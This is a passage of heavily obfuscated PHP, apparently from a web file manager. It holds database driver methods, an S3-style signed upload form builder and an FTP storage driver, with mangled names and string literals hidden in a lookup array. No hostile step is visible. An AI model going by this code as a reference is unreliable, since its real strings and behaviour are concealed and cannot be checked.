{ $¸ò© ¸ =& $_SERVER[¹ş¤¶ĞÖ]; $¤¼ğ—ˆ‚ = !empty($´–ÆÉÉ) ? $¸ò© ¸[930] . $´–ÆÉÉ . $¸ò© ¸[931] : $¸ò© ¸[932]; $À„æëğá = $this->query($¤¼ğ—ˆ‚); $÷’„êû = array(); if ($À„æëğá) { foreach ($À„æëğá as $Ÿ ß­¿… => $ŠÇªÚĞå) { $÷’„êû[$Ÿ ß­¿…] = current($ŠÇªÚĞå); } } return $÷’„êû; } public function replace($×Ş˜†ƒ, $ûóÃ•‚ğ = array()) { $¨¥´ß•° =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($×Ş˜†ƒ as $­ô’ĞŸ¨ => $–Şºßü¼) { $‹İ®·‰ı = $this->parseValue($–Şºßü¼); if (is_scalar($‹İ®·‰ı)) { $Ú“³×«ç[] = $‹İ®·‰ı; $ëö¸ÊÙ[] = $this->parseKey($­ô’ĞŸ¨); } } $À‡ğ˜ı§ = $¨¥´ß•°[933] . $this->parseTable($ûóÃ•‚ğ[$¨¥´ß•°[308]]) . $¨¥´ß•°[934] . implode($¨¥´ß•°[50], $ëö¸ÊÙ) . $¨¥´ß•°[935] . implode($¨¥´ß•°[50], $Ú“³×«ç) . $¨¥´ß•°[936]; return $this->execute($À‡ğ˜ı§); } public function insertAll($ö×Åâî¶, $ÔÅ´Æçš = array(), $¹¹Î“çõ = false) { $†¾û”Îç =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($ö×Åâî¶[0])) { return !1; } $Ä’ë°™  = array_keys($ö×Åâî¶[0]); $™‰úŸù÷ = array(); foreach ($ö×Åâî¶ as $‚Ş‚¸ÛÇ) { $ªŸºöí¬ = array(); foreach ($‚Ş‚¸ÛÇ as $ŠÆúÃÂ => $êÅ°ÒÃ) { $êÅ°ÒÃ = $this->parseValue($êÅ°ÒÃ); if (is_scalar($êÅ°ÒÃ)) { $ªŸºöí¬[] = $êÅ°ÒÃ; } } $™‰úŸù÷[] = $†¾û”Îç[289] . implode($†¾û”Îç[50], $ªŸºöí¬) . $†¾û”Îç[936]; } array_walk($Ä’ë°™ , array($this, $†¾û”Îç[937])); $°öÛ ëÓ = $¹¹Î“çõ ? $†¾û”Îç[938] : $†¾û”Îç[939]; $ı¿‰­ƒ¶ = $°öÛ ëÓ . $†¾û”Îç[940] . $this->parseTable($ÔÅ´Æçš[$†¾û”Îç[308]]) . $†¾û”Îç[934] . implode($†¾û”Îç[50], $Ä’ë°™ ) . $†¾û”Îç[941] . implode($†¾û”Îç[50], $™‰úŸù÷); return $this->execute($ı¿‰­ƒ¶); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ô–°ë÷é =& $_SERVER[¹ş¤¶ĞÖ]; $this->error = $this->_linkID->errno . $ô–°ë÷é[4] . $this->_linkID->error; if ($ô–°ë÷é[12] != $this->queryStr) { $this->error .= LNG($ô–°ë÷é[48]) . $this->queryStr; } think_trace($this->error, $ô–°ë÷é[12], $ô–°ë÷é[49]); return $this->error; } public function escapeString($Ñˆ½ş) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ñˆ½ş); } else { return addslashes($Ñˆ½ş); } } public function parseKey(&$Ÿİ³°, $Õâ—ÅÎÎ = true) { $ßŒ˜‚—– =& $_SERVER[¹ş¤¶ĞÖ]; if ($Õâ—ÅÎÎ) { $Ÿİ³° = $this->parseKeyCheck($Ÿİ³°); } if ($Ÿİ³° != $ßŒ˜‚—–[189] && !preg_match($ßŒ˜‚—–[942], $Ÿİ³°)) { $Ÿİ³° = $ßŒ˜‚—–[414] . trim($Ÿİ³°, $ßŒ˜‚—–[414]) . $ßŒ˜‚—–[414]; } return $Ÿİ³°; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($†ƒ’ÔÏ = '') { $°¬¶‚ë› =& $_SERVER[¹ş¤¶ĞÖ]; if (!class_exists($°¬¶‚ë›[945])) { think_exception(think_lang($°¬¶‚ë›[14]) . $°¬¶‚ë›[946]); } if (!empty($†ƒ’ÔÏ)) { $this->config = $†ƒ’ÔÏ; if (empty($this->config[$°¬¶‚ë›[17]])) { $this->config[$°¬¶‚ë›[17]] = array(); } } } public function connect($àÊÇŞ¦Ÿ = '', $‰ŒÕçº = 0) { $¶¸»¼«Ó =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->linkID[$‰ŒÕçº])) { if (empty($àÊÇŞ¦Ÿ)) { $àÊÇŞ¦Ÿ = $this->config; } $¼—°Ù = !empty($àÊÇŞ¦Ÿ[$¶¸»¼«Ó[17]][$¶¸»¼«Ó[18]]) ? $àÊÇŞ¦Ÿ[$¶¸»¼«Ó[17]][$¶¸»¼«Ó[18]] : $this->pconnect; if ($¼—°Ù) { $àÊÇŞ¦Ÿ[$¶¸»¼«Ó[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‰ŒÕçº] = new PDO($àÊÇŞ¦Ÿ[$¶¸»¼«Ó[947]], $àÊÇŞ¦Ÿ[$¶¸»¼«Ó[919]], $àÊÇŞ¦Ÿ[$¶¸»¼«Ó[920]], $àÊÇŞ¦Ÿ[$¶¸»¼«Ó[17]]); } catch (PDOException $éã…È½¼) { think_exception($éã…È½¼->getMessage()); } $this->dbType = $this->_getDsnType($àÊÇŞ¦Ÿ[$¶¸»¼«Ó[947]]); if (in_array($this->dbType, array($¶¸»¼«Ó[948], $¶¸»¼«Ó[949], $¶¸»¼«Ó[950], $¶¸»¼«Ó[951]))) { think_exception($¶¸»¼«Ó[952] . $this->dbType . $¶¸»¼«Ó[953] . $this->dbType . $¶¸»¼«Ó[954]); } if (!$this->linkID[$‰ŒÕçº]) { think_exception($¶¸»¼«Ó[955]); } try { $this->linkID[$‰ŒÕçº]->exec($¶¸»¼«Ó[956] . think_config($¶¸»¼«Ó[922])); } catch (Exception $éã…È½¼) { } $this->connected = !0; if (1 != think_config($¶¸»¼«Ó[22])) { unset($this->config); } } return $this->linkID[$‰ŒÕçº]; } public function free() { $this->PDOStatement = null; } public function query($‘´ÓŞ¼, $¡‚Ç”Â© = array()) { $Çáöœôû =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘´ÓŞ¼; if (!empty($¡‚Ç”Â©)) { $this->queryStr .= $Çáöœôû[957] . print_r($¡‚Ç”Â©, !0) . $Çáöœôû[958]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Çáöœôû[23], 1); think_status($Çáöœôû[24]); $this->PDOStatement = $this->_linkID->prepare($‘´ÓŞ¼); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $˜ãä»É = $this->PDOStatement->execute($¡‚Ç”Â©); $this->debug(); if (!1 === $˜ãä»É) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($›œÚÚ¥‡, $Æ·©¸£ = array()) { $œÄ»œ¿ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›œÚÚ¥‡; if (!empty($Æ·©¸£)) { $this->queryStr .= $œÄ»œ¿[957] . print_r($Æ·©¸£, !0) . $œÄ»œ¿[958]; } $´ÔÃş = !1; if ($this->dbType == $œÄ»œ¿[951]) { if (preg_match($œÄ»œ¿[959], $this->queryStr, $óÙä½÷İ)) { $this->table = think_config($œÄ»œ¿[960]) . str_ireplace(think_config($œÄ»œ¿[961]), $œÄ»œ¿[407], $óÙä½÷İ[2]); $´ÔÃş = (bool) $this->query($œÄ»œ¿[962] . strtoupper($this->table) . $œÄ»œ¿[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($œÄ»œ¿[25], 1); think_status($œÄ»œ¿[24]); $this->PDOStatement = $this->_linkID->prepare($›œÚÚ¥‡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‚ë½Ÿ = $this->PDOStatement->execute($Æ·©¸£); $this->debug(); if (!1 === $‚ë½Ÿ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($´ÔÃş || preg_match($œÄ»œ¿[963], $›œÚÚ¥‡)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸÌ¨à®Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$ŸÌ¨à®Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÑÂş¢¾‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÑÂş¢¾‚) { $this->error(); return !1; } } return !0; } private function getAll() { $Ö¦†ñÖŠ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ö¦†ñÖŠ); return $Ö¦†ñÖŠ; } public function getFields($ÌÆÖÉ¿Ñ) { $®Õõ‚ôØ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (think_config($®Õõ‚ôØ[964])) { $Š‘¡Ë Ô = str_replace($®Õõ‚ôØ[965], $ÌÆÖÉ¿Ñ, think_config($®Õõ‚ôØ[964])); } else { switch ($this->dbType) { case $®Õõ‚ôØ[948]: case $®Õõ‚ôØ[966]: $Š‘¡Ë Ô = "\x53\x45\x4c\105\103\124\40\x20\40\143\157\154\x75\x6d\156\137\156\x61\155\x65\x20\141\x73\x20\47\116\x61\x6d\145\47\54\40\40\40\144\x61\x74\x61\x5f\164\171\x70\145\x20\x61\163\40\47\124\171\x70\x65\x27\x2c\40\40\40\x63\x6f\154\x75\155\x6e\137\144\145\x66\141\165\154\164\x20\x61\x73\40\x27\x44\x65\x66\141\165\154\164\x27\x2c\40\40\x20\x69\x73\x5f\156\165\x6c\x6c\141\x62\154\x65\x20\x61\163\x20\47\116\165\154\154\47\xa\x9\x9\x46\x52\117\115\x9\x69\x6e\146\x6f\x72\155\141\x74\151\157\156\137\x73\x63\x68\x65\155\141\56\x74\141\142\154\145\163\x20\101\123\40\164\xa\11\11\112\117\x49\x4e\11\x69\156\x66\157\162\155\x61\164\x69\x6f\156\137\163\143\x68\x65\155\141\56\x63\x6f\154\x75\155\156\x73\x20\x41\123\x20\x63\12\x9\x9\x4f\116\40\x20\164\56\x74\x61\x62\154\145\x5f\x63\141\x74\x61\x6c\x6f\147\x20\75\x20\x63\56\164\x61\142\154\x65\x5f\x63\x61\x74\x61\x6c\157\147\xa\x9\11\101\x4e\104\40\x74\x2e\164\141\x62\x6c\145\137\163\143\150\x65\x6d\141\x20\75\40\x63\56\x74\141\x62\154\145\137\163\x63\x68\x65\155\x61\xa\11\x9\x41\x4e\x44\40\164\x2e\164\x61\x62\154\x65\x5f\156\141\155\145\x20\75\40\143\56\164\141\x62\154\145\137\x6e\141\x6d\x65\xa\x9\11\127\110\x45\x52\x45\x20\40\40\164\56\x74\x61\x62\154\x65\x5f\x6e\x61\x6d\145\40\75\x20\47{$ÌÆÖÉ¿Ñ}\47"; break; case $®Õõ‚ôØ[967]: $Š‘¡Ë Ô = $®Õõ‚ôØ[968] . $ÌÆÖÉ¿Ñ . $®Õõ‚ôØ[969]; break; case $®Õõ‚ôØ[949]: case $®Õõ‚ôØ[951]: $Š‘¡Ë Ô = $®Õõ‚ôØ[970] . $®Õõ‚ôØ[971] . $®Õõ‚ôØ[972] . strtoupper($ÌÆÖÉ¿Ñ) . $®Õõ‚ôØ[973] . strtoupper($ÌÆÖÉ¿Ñ) . $®Õõ‚ôØ[974]; break; case $®Õõ‚ôØ[975]: $Š‘¡Ë Ô = $®Õõ‚ôØ[976] . $ÌÆÖÉ¿Ñ . $®Õõ‚ôØ[977]; break; case $®Õõ‚ôØ[950]: break; case $®Õõ‚ôØ[978]: default: $Š‘¡Ë Ô = $®Õõ‚ôØ[979] . ($this->dbType == $®Õõ‚ôØ[978] ? "\140{$ÌÆÖÉ¿Ñ}\140" : $ÌÆÖÉ¿Ñ); } } $¸Ê…íœ = $this->query($Š‘¡Ë Ô); $°œùâÄÜ = array(); if ($¸Ê…íœ) { foreach ($¸Ê…íœ as $Š‚àªÈ => $´‹ÙÀáê) { $´‹ÙÀáê = array_change_key_case($´‹ÙÀáê); $´‹ÙÀáê[$®Õõ‚ôØ[32]] = isset($´‹ÙÀáê[$®Õõ‚ôØ[32]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[32]] : $®Õõ‚ôØ[407]; $´‹ÙÀáê[$®Õõ‚ôØ[33]] = isset($´‹ÙÀáê[$®Õõ‚ôØ[33]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[33]] : $®Õõ‚ôØ[407]; $çîÇŸóÛ = isset($´‹ÙÀáê[$®Õõ‚ôØ[302]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[302]] : $´‹ÙÀáê[$®Õõ‚ôØ[32]]; $°œùâÄÜ[$çîÇŸóÛ] = array($®Õõ‚ôØ[32] => $çîÇŸóÛ, $®Õõ‚ôØ[33] => $´‹ÙÀáê[$®Õõ‚ôØ[33]], $®Õõ‚ôØ[35] => (bool) (isset($´‹ÙÀáê[$®Õõ‚ôØ[103]]) && $´‹ÙÀáê[$®Õõ‚ôØ[103]] === $®Õõ‚ôØ[12] || isset($´‹ÙÀáê[$®Õõ‚ôØ[35]]) && $´‹ÙÀáê[$®Õõ‚ôØ[35]] === $®Õõ‚ôØ[12]), $®Õõ‚ôØ[37] => isset($´‹ÙÀáê[$®Õõ‚ôØ[37]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[37]] : (isset($´‹ÙÀáê[$®Õõ‚ôØ[56]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[56]] : $®Õõ‚ôØ[407]), $®Õõ‚ôØ[39] => isset($´‹ÙÀáê[$®Õõ‚ôØ[94]]) ? strtolower($´‹ÙÀáê[$®Õõ‚ôØ[94]]) == $®Õõ‚ôØ[41] : (isset($´‹ÙÀáê[$®Õõ‚ôØ[57]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[57]] : !1), $®Õõ‚ôØ[42] => isset($´‹ÙÀáê[$®Õõ‚ôØ[980]]) ? strtolower($´‹ÙÀáê[$®Õõ‚ôØ[980]]) == $®Õõ‚ôØ[44] : (isset($´‹ÙÀáê[$®Õõ‚ôØ[94]]) ? $´‹ÙÀáê[$®Õõ‚ôØ[94]] : !1)); } } return $°œùâÄÜ; } public function getTables($¬â´Ó™— = '') { $¸ÜÚ´ôİ =& $_SERVER[¹ş¤¶ĞÖ]; if (think_config($¸ÜÚ´ôİ[981])) { $âîõéÄ = str_replace($¸ÜÚ´ôİ[982], $¬â´Ó™—, think_config($¸ÜÚ´ôİ[981])); } else { switch ($this->dbType) { case $¸ÜÚ´ôİ[949]: case $¸ÜÚ´ôİ[951]: $âîõéÄ = $¸ÜÚ´ôİ[983]; break; case $¸ÜÚ´ôİ[948]: case $¸ÜÚ´ôİ[966]: $âîõéÄ = $¸ÜÚ´ôİ[984]; break; case $¸ÜÚ´ôİ[975]: $âîõéÄ = $¸ÜÚ´ôİ[985]; break; case $¸ÜÚ´ôİ[950]: think_exception(think_lang($¸ÜÚ´ôİ[986]) . $¸ÜÚ´ôİ[987]); break; case $¸ÜÚ´ôİ[967]: $âîõéÄ = $¸ÜÚ´ôİ[45] . $¸ÜÚ´ôİ[46] . $¸ÜÚ´ôİ[47]; break; case $¸ÜÚ´ôİ[978]: default: if (!empty($¬â´Ó™—)) { $âîõéÄ = $¸ÜÚ´ôİ[930] . $¬â´Ó™— . $¸ÜÚ´ôİ[931]; } else { $âîõéÄ = $¸ÜÚ´ôİ[932]; } } } $”ÎÑö· = $this->query($âîõéÄ); $œäÏà‘† = array(); foreach ($”ÎÑö· as $äù°·‡ => $—·Ôä£¿) { $œäÏà‘†[$äù°·‡] = current($—·Ôä£¿); } return $œäÏà‘†; } protected function parseLimit($ç’ÂŠ§²) { $¥×»ã‹ =& $_SERVER[¹ş¤¶ĞÖ]; $ûğ¤ß£ = $¥×»ã‹[12]; if (!empty($ç’ÂŠ§²)) { switch ($this->dbType) { case $¥×»ã‹[975]: case $¥×»ã‹[967]: $ç’ÂŠ§² = explode($¥×»ã‹[50], $ç’ÂŠ§²); if (count($ç’ÂŠ§²) > 1) { $ûğ¤ß£ .= $¥×»ã‹[51] . $ç’ÂŠ§²[1] . $¥×»ã‹[52] . $ç’ÂŠ§²[0] . $¥×»ã‹[53]; } else { $ûğ¤ß£ .= $¥×»ã‹[51] . $ç’ÂŠ§²[0] . $¥×»ã‹[53]; } break; case $¥×»ã‹[948]: case $¥×»ã‹[966]: break; case $¥×»ã‹[950]: break; case $¥×»ã‹[949]: case $¥×»ã‹[951]: break; case $¥×»ã‹[978]: default: $ûğ¤ß£ .= $¥×»ã‹[51] . $ç’ÂŠ§² . $¥×»ã‹[53]; } } return $ûğ¤ß£; } public function parseKey(&$ÑœªÆ´, $ÙÈ ´œĞ = true) { $˜¹³¯²ñ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ÙÈ ´œĞ) { $ÑœªÆ´ = $this->parseKeyCheck($ÑœªÆ´); } if ($this->dbType == $˜¹³¯²ñ[978]) { if ($ÑœªÆ´ != $˜¹³¯²ñ[189] && !preg_match($˜¹³¯²ñ[942], $ÑœªÆ´)) { $ÑœªÆ´ = $˜¹³¯²ñ[414] . trim($ÑœªÆ´, $˜¹³¯²ñ[414]) . $˜¹³¯²ñ[414]; } return $ÑœªÆ´; } else { return parent::parseKey($ÑœªÆ´, $ÙÈ ´œĞ); } } public function close() { $this->_linkID = null; } public function error() { $ÆÆı¸ËÀ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->PDOStatement) { $ıŸıãÈË = $this->PDOStatement->errorInfo(); $this->error = $ıŸıãÈË[1] . $ÆÆı¸ËÀ[4] . $ıŸıãÈË[2]; } else { $this->error = $ÆÆı¸ËÀ[12]; } if ($ÆÆı¸ËÀ[12] != $this->queryStr) { $this->error .= LNG($ÆÆı¸ËÀ[48]) . $this->queryStr; } think_trace($this->error, $ÆÆı¸ËÀ[12], $ÆÆı¸ËÀ[49]); return $this->error; } public function escapeString($ĞÒôÓºË) { $ïÄüÌ×È =& $_SERVER[¹ş¤¶ĞÖ]; switch ($this->dbType) { case $ïÄüÌ×È[975]: case $ïÄüÌ×È[948]: case $ïÄüÌ×È[966]: case $ïÄüÌ×È[978]: return addslashes($ĞÒôÓºË); case $ïÄüÌ×È[950]: case $ïÄüÌ×È[967]: case $ïÄüÌ×È[949]: case $ïÄüÌ×È[951]: return str_ireplace($ïÄüÌ×È[58], $ïÄüÌ×È[59], $ĞÒôÓºË); } } protected function parseValue($†Í•°§) { $ö‰şĞ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($†Í•°§)) { $ÆÈ¸¹”à = strpos($†Í•°§, $ö‰şĞ[4]) === 0 && in_array($†Í•°§, array_keys($this->bind)); $†Í•°§ = $ÆÈ¸¹”à ? $this->escapeString($†Í•°§) : $ö‰şĞ[988] . $this->escapeString($†Í•°§) . $ö‰şĞ[988]; } elseif (isset($†Í•°§[0]) && is_string($†Í•°§[0]) && strtolower($†Í•°§[0]) == $ö‰şĞ[326]) { $†Í•°§ = $this->escapeString($†Í•°§[1]); } elseif (is_array($†Í•°§)) { $†Í•°§ = array_map(array($this, $ö‰şĞ[989]), $†Í•°§); } elseif (is_bool($†Í•°§)) { $†Í•°§ = $†Í•°§ ? $ö‰şĞ[88] : $ö‰şĞ[198]; } elseif (is_null($†Í•°§)) { $†Í•°§ = $ö‰şĞ[103]; } return $†Í•°§; } public function getLastInsertId() { $º‹ëì =& $_SERVER[¹ş¤¶ĞÖ]; switch ($this->dbType) { case $º‹ëì[975]: case $º‹ëì[967]: case $º‹ëì[948]: case $º‹ëì[966]: case $º‹ëì[950]: case $º‹ëì[978]: return $this->_linkID->lastInsertId(); case $º‹ëì[949]: case $º‹ëì[951]: $÷¡ø†õ = $this->table; $Ó¿ÄÍ = $this->query("\123\x45\x4c\105\x43\124\x20{$÷¡ø†õ}\x2e\x63\165\x72\162\166\141\x6c\x20\143\x75\162\162\166\x61\154\x20\106\122\x4f\x4d\x20\x64\165\x61\x6c"); return $Ó¿ÄÍ ? $Ó¿ÄÍ[0][$º‹ëì[990]] : 0; } } } goto fš£Ù¡ÑŞ; cØáØ¶ƒ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Àğêãñ) { parent::__construct($Àğêãñ); $this->signatureVersion($_SERVER[¹ş¤¶ĞÖ][216]); } public function uploadFormData($µºšçŞ¬, $Úû”ø˜ = 3600) { $µäƒèø =& $_SERVER[¹ş¤¶ĞÖ]; $¡™şÄ§³ = $µäƒèø[199]; $±Ğ•µ«Ú = $µäƒèø[238]; $‘ñĞ¦‰Ô = $µäƒèø[62]; $¦®Ñ¹Ê = gmdate($µäƒèø[239]); $Ş²©ÈÊ = gmdate($µäƒèø[240]); $Üı¥™ = $µäƒèø[241]; $ğÙ­±ƒÈ = $Úû”ø˜ . $µäƒèø[12]; $ÑŞ«Í™ = $µäƒèø[242]; $ÛıœÉ÷… = array($this->accessKey, $Ş²©ÈÊ, $this->region, $‘ñĞ¦‰Ô, $Üı¥™); $Š¸õŞâ = implode($µäƒèø[8], $ÛıœÉ÷…); $ƒüÑï÷’ = array($µäƒèø[243] => gmdate($µäƒèø[1358], strtotime($µäƒèø[245])), $µäƒèø[246] => array(array($µäƒèø[247] => $this->bucket), array($µäƒèø[248] => $¡™şÄ§³), array($µäƒèø[249], $µäƒèø[250], $µäƒèø[12]), array($µäƒèø[249], $µäƒèø[251], $µäƒèø[12]), array($µäƒèø[249], $µäƒèø[252], $µäƒèø[12]), array($µäƒèø[253] => $ÑŞ«Í™), array($µäƒèø[254] => $Š¸õŞâ), array($µäƒèø[255] => $±Ğ•µ«Ú), array($µäƒèø[256] => $¦®Ñ¹Ê), array($µäƒèø[257] => $ğÙ­±ƒÈ))); $æµ…Õ = base64_encode(json_encode($ƒüÑï÷’)); $ãÂƒ’²¹ = hash_hmac($µäƒèø[258], $Ş²©ÈÊ, $µäƒèø[259] . $this->secret, !0); $¯İşøõ = hash_hmac($µäƒèø[258], $this->region, $ãÂƒ’²¹, !0); $±õ•¶ø’ = hash_hmac($µäƒèø[258], $‘ñĞ¦‰Ô, $¯İşøõ, !0); $á³«§ƒô = hash_hmac($µäƒèø[258], $Üı¥™, $±õ•¶ø’, !0); $îã½ö‘È = hash_hmac($µäƒèø[258], $æµ…Õ, $á³«§ƒô); $ÛÂû¿ÚÏ = array($µäƒèø[215] => $µäƒèø[12], $µäƒèø[260] => $µäƒèø[12], $µäƒèø[248] => $¡™şÄ§³, $µäƒèø[253] => $ÑŞ«Í™, $µäƒèø[261] => $æµ…Õ, $µäƒèø[262] => $Š¸õŞâ, $µäƒèø[263] => $±Ğ•µ«Ú, $µäƒèø[264] => $¦®Ñ¹Ê, $µäƒèø[265] => $ğÙ­±ƒÈ, $µäƒèø[266] => $îã½ö‘È, $µäƒèø[182] => $this->getHost()); return $ÛÂû¿ÚÏ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($í§Óß×Å) { parent::__construct(); if (count($í§Óß×Å) > 0) { $this->_init($í§Óß×Å); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ñèÖâŠ) { $æó»ê» =& $_SERVER[¹ş¤¶ĞÖ]; global $config; $this->appCharset = $config[$æó»ê»[1385]]; $this->systemCharset = $config[$æó»ê»[1386]]; if (isset($ñèÖâŠ[$æó»ê»[1387]]) && $ñèÖâŠ[$æó»ê»[1387]]) { $this->systemCharset = $ñèÖâŠ[$æó»ê»[1387]]; } } public function iconvApp($¤‡·È) { return $this->iconvTo($¤‡·È, $this->systemCharset, $this->appCharset); } public function iconvSystem($•¡©­Õ) { return $this->iconvTo($•¡©­Õ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ ì®Ò²€) { $šÜœÜ¢ö =& $_SERVER[¹ş¤¶ĞÖ]; $€Ø†ÌÂ÷ = $this->iconvApp($this->pathBase); $ ì®Ò²€ = $this->iconvApp($ ì®Ò²€); if (substr($€Ø†ÌÂ÷, 0, 2) == $šÜœÜ¢ö[1311]) { $€Ø†ÌÂ÷ = BASIC_PATH . substr($€Ø†ÌÂ÷, 2); } if (substr($ ì®Ò²€, 0, 2) == $šÜœÜ¢ö[1311]) { $ ì®Ò²€ = BASIC_PATH . substr($ ì®Ò²€, 2); } $€Ø†ÌÂ÷ = KodIO::clear($€Ø†ÌÂ÷); $ ì®Ò²€ = KodIO::clear($ ì®Ò²€); $ ì®Ò²€ = substr($ ì®Ò²€, strlen($€Ø†ÌÂ÷)); if (empty($this->pathDriver)) { return $ ì®Ò²€; } return $this->pathDriver . $šÜœÜ¢ö[8] . ltrim($ ì®Ò²€, $šÜœÜ¢ö[8]); } private function _init($³æä“Á = array()) { $º§÷äéš =& $_SERVER[¹ş¤¶ĞÖ]; if (!function_exists($º§÷äéš[1388])) { throw new Exception(LNG($º§÷äéš[1389])); } $this->config = $³æä“Á; $this->charsetReset($³æä“Á); foreach ($³æä“Á as $ÍºşŸ«³ => $Üç˜€ë) { if (isset($this->{$ÍºşŸ«³})) { $this->{$ÍºşŸ«³} = $Üç˜€ë; } } return $this->_login($³æä“Á); } private function _login($üÇ©™¶†) { $û‰™Ë«¯ =& $_SERVER[¹ş¤¶ĞÖ]; static $í“ÜïŞÙ = array(); $¿„êŸº’ = md5(json_encode($üÇ©™¶†)); if (isset($í“ÜïŞÙ[$¿„êŸº’])) { foreach ($í“ÜïŞÙ[$¿„êŸº’] as $óé»­îÂ => $¤Éøİé½) { $this->{$óé»­îÂ} = $¤Éøİé½; } return !0; } $˜¶àé = parse_url(trim($this->server, $û‰™Ë«¯[8])); $this->host = $˜¶àé[$û‰™Ë«¯[182]]; $áÂæğ‹¶ = isset($˜¶àé[$û‰™Ë«¯[181]]) && $˜¶àé[$û‰™Ë«¯[181]] == $û‰™Ë«¯[1390] ? !0 : !1; $this->scheme = $áÂæğ‹¶ ? $û‰™Ë«¯[1391] : $û‰™Ë«¯[1392]; $this->port = isset($˜¶àé[$û‰™Ë«¯[183]]) ? $˜¶àé[$û‰™Ë«¯[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ï’ú–¶´ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ù¤–­ƒµ = $this->pasv == $û‰™Ë«¯[88] ? !0 : !1; @ftp_pasv($this->connect, $ù¤–­ƒµ); $í“ÜïŞÙ[$¿„êŸº’] = array($û‰™Ë«¯[1393] => $this->connect, $û‰™Ë«¯[182] => $this->host, $û‰™Ë«¯[181] => $this->scheme, $û‰™Ë«¯[183] => $this->port); return $ï’ú–¶´; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($´¿ÛšŸõ, $ÈÙ±„òÒ = '', $‰øŞº¥œ = REPEAT_RENAME) { if ($this->setContent($´¿ÛšŸõ, $ÈÙ±„òÒ)) { return $this->getPathOuter($´¿ÛšŸõ); } return !1; } public function mkdir($”ÚĞç‰, $´úç™’ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $”ÚĞç‰ = $this->iconvSystem($”ÚĞç‰); if ($this->_isFolder($”ÚĞç‰) || @ftp_mkdir($this->connect, $”ÚĞç‰)) { return $this->getPathOuter($”ÚĞç‰); } if (!$this->mkdir($this->pathFather($”ÚĞç‰))) { return !1; } if ($”ÚĞç‰ = @ftp_mkdir($this->connect, $”ÚĞç‰)) { return $this->getPathOuter($”ÚĞç‰); } return !1; } public function copyFile($ÖÌØÄÈ, $óÅıÑ£í) { if (!$this->_isconn()) { return !1; } $ß—¼’•§ = $this->pathThis($this->iconvSystem($ÖÌØÄÈ)); $í†–ÌÂ­ = $this->tempFile($ß—¼’•§); $˜ş¸ú¸À = $this->iconvApp($í†–ÌÂ­); $this->download($ÖÌØÄÈ, $˜ş¸ú¸À); $É¯İ¡²î = $this->upload($óÅıÑ£í, $˜ş¸ú¸À); $this->tempFileRemve($í†–ÌÂ­); return $É¯İ¡²î; } public function moveFile($ €Şï, $÷Áò‚Æ¥) { if (!$this->_isconn()) { return !1; } $ €Şï = $this->iconvSystem($ €Şï); $÷Áò‚Æ¥ = $this->iconvSystem($÷Áò‚Æ¥); $Ë˜Ş™ûÇ = @ftp_rename($this->connect, $ €Şï, $÷Áò‚Æ¥); return $Ë˜Ş™ûÇ ? $this->getPathOuter($÷Áò‚Æ¥) : !1; } public function delFile($ï’˜üĞô) { if (!$this->_isconn()) { return !1; } $ï’˜üĞô = $this->iconvSystem($ï’˜üĞô); return @ftp_delete($this->connect, $ï’˜üĞô); } public function delFolder($Ã¶”Ìûˆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $éÊ¾·Ö = $‡îÅ¥ë¨ = array(); $this->fileList($Ã¶”Ìûˆ, $éÊ¾·Ö, $‡îÅ¥ë¨, !0); $this->listItemCache = !0; foreach ($‡îÅ¥ë¨ as $øç‡ÔÎ) { $Ä×Ûô¾É = $this->iconvSystem($øç‡ÔÎ[$_SERVER[¹ş¤¶ĞÖ][32]]); $æËÒöª¦ = @ftp_delete($this->connect, $Ä×Ûô¾É); if (!$æËÒöª¦) { return !1; } } foreach ($éÊ¾·Ö as $Ä×Ûô¾É) { $Ä×Ûô¾É = $this->iconvSystem($Ä×Ûô¾É); $æËÒöª¦ = @ftp_rmdir($this->connect, 